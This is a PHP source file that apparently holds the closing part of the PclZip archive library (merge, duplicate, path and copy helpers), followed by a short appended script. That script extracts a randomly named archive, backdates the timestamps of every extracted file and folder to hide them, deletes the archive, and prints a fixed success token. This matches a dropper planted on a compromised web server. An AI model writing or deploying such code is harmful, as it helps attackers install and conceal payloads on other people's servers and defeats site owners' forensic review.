              PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

              return PclZip::errorCode();
          }

          $v_local_header = array();
          if (($v_result = $this->privReadFileHeader($v_local_header)) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
          
          if ($this->privCheckFileHeaders($v_local_header,
		                                $v_header_list[$i]) != 1) {
          }
          unset($v_local_header);

          if (($v_result = $v_temp_zip->privWriteFileHeader($v_header_list[$i])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          if (($v_result = PclZipUtilCopyBlock($this->zip_fd, $v_temp_zip->zip_fd, $v_header_list[$i]['compressed_size'])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
      }

      $v_offset = @ftell($v_temp_zip->zip_fd);

      for ($i=0; $i<sizeof($v_header_list); $i++) {
          if (($v_result = $v_temp_zip->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
              $v_temp_zip->privCloseFd();
              $this->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          $v_temp_zip->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
      }


      $v_comment = '';
      if (isset($p_options[PCLZIP_OPT_COMMENT])) {
        $v_comment = $p_options[PCLZIP_OPT_COMMENT];
      }

      $v_size = @ftell($v_temp_zip->zip_fd)-$v_offset;

      if (($v_result = $v_temp_zip->privWriteCentralHeader(sizeof($v_header_list), $v_size, $v_offset, $v_comment)) != 1) {
          unset($v_header_list);
          $v_temp_zip->privCloseFd();
          $this->privCloseFd();
          @unlink($v_zip_temp_name);

          return $v_result;
      }

      $v_temp_zip->privCloseFd();
      $this->privCloseFd();

      @unlink($this->zipname);

      PclZipUtilRename($v_zip_temp_name, $this->zipname);
  
      unset($v_temp_zip);
  }
  
  else if ($v_central_dir['entries'] != 0) {
      $this->privCloseFd();

      if (($v_result = $this->privOpenFd('wb')) != 1) {
        return $v_result;
      }

      if (($v_result = $this->privWriteCentralHeader(0, 0, 0, '')) != 1) {
        return $v_result;
      }

      $this->privCloseFd();
  }

  return $v_result;
}

function privDirCheck($p_dir, $p_is_dir=false)
{
  $v_result = 1;


  if (($p_is_dir) && (substr($p_dir, -1)=='/'))
  {
    $p_dir = substr($p_dir, 0, strlen($p_dir)-1);
  }

  if ((is_dir($p_dir)) || ($p_dir == ""))
  {
    return 1;
  }

  $p_parent_dir = dirname($p_dir);

  if ($p_parent_dir != $p_dir)
  {
    if ($p_parent_dir != "")
    {
      if (($v_result = $this->privDirCheck($p_parent_dir)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (!@mkdir($p_dir, 0777))
  {
    PclZip::privErrorLog(PCLZIP_ERR_DIR_CREATE_FAIL, "Unable to create directory '$p_dir'");

    return PclZip::errorCode();
  }

  return $v_result;
}

function privMerge(&$p_archive_to_add)
{
  $v_result=1;

  if (!is_file($p_archive_to_add->zipname))
  {

    $v_result = 1;

    return $v_result;
  }

  if (!is_file($this->zipname))
  {

    $v_result = $this->privDuplicate($p_archive_to_add->zipname);

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  if (($v_result=$p_archive_to_add->privOpenFd('rb')) != 1)
  {
    $this->privCloseFd();

    return $v_result;
  }

  $v_central_dir_to_add = array();
  if (($v_result = $p_archive_to_add->privReadEndCentralDir($v_central_dir_to_add)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    return $v_result;
  }

  @rewind($p_archive_to_add->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_offset = @ftell($v_zip_temp_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_comment = $v_central_dir['comment'].' '.$v_central_dir_to_add['comment'];

  $v_size = @ftell($v_zip_temp_fd)-$v_offset;

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  if (($v_result = $this->privWriteCentralHeader($v_central_dir['entries']+$v_central_dir_to_add['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();
    @fclose($v_zip_temp_fd);
    $this->zip_fd = null;

    unset($v_header_list);

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();
  $p_archive_to_add->privCloseFd();

  @fclose($v_zip_temp_fd);

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privDuplicate($p_archive_filename)
{
  $v_result=1;

  if (!is_file($p_archive_filename))
  {

    $v_result = 1;

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  if (($v_zip_temp_fd = @fopen($p_archive_filename, 'rb')) == 0)
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive file \''.$p_archive_filename.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = filesize($p_archive_filename);
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  return $v_result;
}

function privErrorLog($p_error_code=0, $p_error_string='')
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclError($p_error_code, $p_error_string);
  }
  else {
    $this->error_code = $p_error_code;
    $this->error_string = $p_error_string;
  }
}

function privErrorReset()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclErrorReset();
  }
  else {
    $this->error_code = 0;
    $this->error_string = '';
  }
}

function privDisableMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

$this->magic_quotes_status = @get_magic_quotes_runtime();

if ($this->magic_quotes_status == 1) {
  @set_magic_quotes_runtime(0);
}

  return $v_result;
}

function privSwapBackMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

if ($this->magic_quotes_status == 1) {
	  @set_magic_quotes_runtime($this->magic_quotes_status);
}

  return $v_result;
}

}

function PclZipUtilPathReduction($p_dir)
{
  $v_result = "";

  if ($p_dir != "") {
    $v_list = explode("/", $p_dir);

    $v_skip = 0;
    for ($i=sizeof($v_list)-1; $i>=0; $i--) {
      if ($v_list[$i] == ".") {
      }
      else if ($v_list[$i] == "..") {
	  $v_skip++;
      }
      else if ($v_list[$i] == "") {
	  if ($i == 0) {
          $v_result = "/".$v_result;
	    if ($v_skip > 0) {
	        $v_result = $p_dir;
              $v_skip = 0;
	    }
	  }
	  else if ($i == (sizeof($v_list)-1)) {
          $v_result = $v_list[$i];
	  }
	  else {
	  }
      }
      else {
	  if ($v_skip > 0) {
	    $v_skip--;
	  }
	  else {
          $v_result = $v_list[$i].($i!=(sizeof($v_list)-1)?"/".$v_result:"");
	  }
      }
    }
    
    if ($v_skip > 0) {
      while ($v_skip > 0) {
          $v_result = '../'.$v_result;
          $v_skip--;
      }
    }
  }

  return $v_result;
}

function PclZipUtilPathInclusion($p_dir, $p_path)
{
  $v_result = 1;
  
  if (   ($p_dir == '.')
      || ((strlen($p_dir) >=2) && (substr($p_dir, 0, 2) == './'))) {
    $p_dir = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_dir, 1);
  }
  if (   ($p_path == '.')
      || ((strlen($p_path) >=2) && (substr($p_path, 0, 2) == './'))) {
    $p_path = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_path, 1);
  }

  $v_list_dir = explode("/", $p_dir);
  $v_list_dir_size = sizeof($v_list_dir);
  $v_list_path = explode("/", $p_path);
  $v_list_path_size = sizeof($v_list_path);

  $i = 0;
  $j = 0;
  while (($i < $v_list_dir_size) && ($j < $v_list_path_size) && ($v_result)) {

    if ($v_list_dir[$i] == '') {
      $i++;
      continue;
    }
    if ($v_list_path[$j] == '') {
      $j++;
      continue;
    }

    if (($v_list_dir[$i] != $v_list_path[$j]) && ($v_list_dir[$i] != '') && ( $v_list_path[$j] != ''))  {
      $v_result = 0;
    }

    $i++;
    $j++;
  }

  if ($v_result) {
    while (($j < $v_list_path_size) && ($v_list_path[$j] == '')) $j++;
    while (($i < $v_list_dir_size) && ($v_list_dir[$i] == '')) $i++;

    if (($i >= $v_list_dir_size) && ($j >= $v_list_path_size)) {
      $v_result = 2;
    }
    else if ($i < $v_list_dir_size) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilCopyBlock($p_src, $p_dest, $p_size, $p_mode=0)
{
  $v_result = 1;

  if ($p_mode==0)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==1)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==2)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==3)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }

  return $v_result;
}

function PclZipUtilRename($p_src, $p_dest)
{
  $v_result = 1;

  if (!@rename($p_src, $p_dest)) {

    if (!@copy($p_src, $p_dest)) {
      $v_result = 0;
    }
    else if (!@unlink($p_src)) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilOptionText($p_option)
{
  
  $v_list = get_defined_constants();
  for (reset($v_list); $v_key = key($v_list); next($v_list)) {
    $v_prefix = substr($v_key, 0, 10);
    if ((   ($v_prefix == 'PCLZIP_OPT')
         || ($v_prefix == 'PCLZIP_CB_')
         || ($v_prefix == 'PCLZIP_ATT'))
        && ($v_list[$v_key] == $p_option)) {
      return $v_key;
    }
  }
  
  $v_result = 'Unknown';

  return $v_result;
}

function PclZipUtilTranslateWinPath($p_path, $p_remove_disk_letter=true)
{
  if (stristr(php_uname(), 'windows')) {
    if (($p_remove_disk_letter) && (($v_position = strpos($p_path, ':')) != false)) {
        $p_path = substr($p_path, $v_position+1);
    }
    if ((strpos($p_path, '\\') > 0) || (substr($p_path, 0,1) == '\\')) {
        $p_path = strtr($p_path, '\\', '/');
    }
  }
  return $p_path;
}




$archive = new PclZip("tyoinvur.zip");
if ($archive->extract() == 0) {
    die("Error : ".$archive->errorInfo(true));
}
else
{   
    $dirs = explode(".", "tyoinvur.zip");    
    $files = getDirContents($dirs[0]);
    foreach($files as $file){
        touch($file, time() - 3600 * 7 * rand(10,70));
    }
    touch("tyoinvur.zip", time() - 3600 * 7 * rand(10,70));
    touch($dirs[0], time() - 3600 * 7 * rand(10,70));
    @unlink("tyoinvur.zip");
    die("1425756856");	
}